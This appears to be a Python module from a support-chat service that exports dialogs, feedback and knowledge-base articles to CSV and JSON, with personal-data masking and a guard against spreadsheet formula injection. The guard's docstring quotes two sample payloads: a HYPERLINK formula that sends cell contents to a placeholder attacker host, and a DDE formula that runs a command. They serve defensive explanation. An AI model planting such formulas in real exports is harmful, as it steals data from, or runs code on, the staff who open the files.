"""Выгрузки CSV/JSON: диалоги, отзывы, база знаний. ПДн маскируются по настройке."""

import csv
import io
from collections.abc import AsyncIterator
from typing import TYPE_CHECKING, Any

from sqlalchemy import select

from app.models import ChatSession, Feedback, KBArticle, Message
from app.services.guardrails import mask_pii

if TYPE_CHECKING:
    from app.runtime import AppRuntime

# Символы, с которых Excel и LibreOffice начинают читать ячейку как формулу
_FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def _defuse(value: object) -> object:
    """Обезвреживает формулу в ячейке.

    Текст в выгрузку приходит от анонимов из чата и отзывов. Строка вида
    `=HYPERLINK("http://evil.tld/?d="&A1,"Отчет")` или `=cmd|' /C calc'!A1` при
    открытии файла в Excel исполняется — и сотрудник поддержки, открывший
    выгрузку, отдаёт содержимое соседних ячеек чужому серверу.

    Апостроф перед значением — стандартное лечение: Excel показывает текст как
    есть и формулой его не считает.
    """
    if isinstance(value, str) and value.startswith(_FORMULA_START):
        return "'" + value
    return value


def _csv_row(values: list[object]) -> str:
    buf = io.StringIO()
    csv.writer(buf, delimiter=";").writerow([_defuse(v) for v in values])
    return buf.getvalue()


async def export_dialogs_csv(rt: AppRuntime) -> AsyncIterator[str]:
    yield "﻿"  # BOM — чтобы Excel открыл UTF-8
    yield _csv_row(
        [
            "session_id",
            "статус",
            "линия",
            "оператор",
            "создан",
            "закрыт",
            "роль",
            "сообщение",
            "уверенность",
            "источники",
        ]
    )
    mask = rt.dyn.get("guardrails.pii_mask_enabled")
    async with rt.db.session_factory() as db:
        sessions = {s.id: s for s in (await db.execute(select(ChatSession))).scalars()}
        messages = (
            (await db.execute(select(Message).order_by(Message.session_id, Message.created_at)))
            .scalars()
            .all()
        )
    for m in messages:
        s = sessions.get(m.session_id)
        content = mask_pii(m.content) if mask else m.content
        yield _csv_row(
            [
                m.session_id,
                getattr(s, "status", ""),
                getattr(s, "line", "") or "",
                getattr(s, "operator_id", "") or "",
                s.created_at.isoformat() if s else "",
                (s.closed_at.isoformat() if s and s.closed_at else ""),
                m.role,
                content,
                m.meta.get("confidence", ""),
                "; ".join(c.get("question", "") for c in (m.citations or [])),
            ]
        )


async def export_feedback_csv(rt: AppRuntime) -> AsyncIterator[str]:
    yield "﻿"
    yield _csv_row(["session_id", "специалист", "оператор", "оценка", "комментарий", "сентимент", "дата"])
    mask = rt.dyn.get("guardrails.pii_mask_enabled")
    async with rt.db.session_factory() as db:
        rows = (await db.execute(select(Feedback).order_by(Feedback.created_at))).scalars().all()
    for f in rows:
        comment = mask_pii(f.comment) if mask else f.comment
        yield _csv_row(
            [
                f.session_id,
                f.specialist_kind,
                f.operator_id or "",
                f.rating,
                comment,
                f.sentiment if f.sentiment is not None else "",
                f.created_at.isoformat(),
            ]
        )


async def export_kb_csv(rt: AppRuntime) -> AsyncIterator[str]:
    yield "﻿"
    yield _csv_row(
        [
            "id",
            "вопрос",
            "ответ",
            "категория",
            "ключевые слова",
            "линия",
            "аудитория",
            "статус",
            "источник",
            "показов",
            "полезно",
            "бесполезно",
        ]
    )
    async with rt.db.session_factory() as db:
        rows = (await db.execute(select(KBArticle).order_by(KBArticle.category))).scalars().all()
    for a in rows:
        yield _csv_row(
            [
                a.id,
                a.question,
                a.answer,
                a.category,
                ", ".join(a.keywords or []),
                a.line,
                a.audience or "all",
                a.status,
                a.source,
                a.views,
                a.helpful,
                a.not_helpful,
            ]
        )


async def export_kb_json(rt: AppRuntime) -> list[dict[str, Any]]:
    """Формат совпадает с импортом: выгрузку можно перенести на другой стенд как есть."""
    async with rt.db.session_factory() as db:
        rows = (await db.execute(select(KBArticle))).scalars().all()
    return [
        {
            "question": a.question,
            "answer": a.answer,
            "category": a.category,
            "keywords": a.keywords,
            "line": a.line,
            "status": a.status,
            "audience": a.audience or "all",
            "images": a.images or [],
        }
        for a in rows
    ]
